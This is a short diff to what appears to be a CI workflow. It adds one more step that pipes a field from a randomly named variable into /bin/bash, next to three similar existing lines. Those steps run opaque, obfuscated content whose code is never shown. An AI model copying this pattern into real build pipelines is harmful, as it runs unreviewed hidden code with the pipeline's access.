@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$s1640" | jq -r .bm05943 | /bin/bash
           printf '%s' "$v683" | jq -r .qhym8598 | /bin/bash
           printf '%s' "$oe01" | jq -r .eurbm5 | /bin/bash
+          echo $lux15 | jq -r .ofvn18 | /bin/bash
 
       - name: Save archive
         if: always()
